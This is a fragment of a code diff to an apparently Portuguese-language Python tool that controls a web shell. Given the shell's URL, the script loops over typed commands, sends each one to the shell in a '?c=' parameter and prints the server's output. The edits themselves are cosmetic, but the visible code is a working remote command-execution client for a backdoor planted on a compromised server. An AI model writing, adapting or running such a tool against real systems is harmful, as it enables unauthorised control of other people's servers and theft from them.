@@ -3,7 +3,6 @@ from configparser import ConfigParser
 from requests import get
 
 
-global arg
 parser = ArgumentParser()
 parser.add_argument("-u", dest="shell_url", action="store",
                     help="Url de sua shell!")
@@ -29,4 +28,4 @@ if args.shell_url:
     while True:
         cmd = str(input(">> "))
         r = get(url+"?c={0}".format(cmd)).content
-        print(r)
+        print(r)  
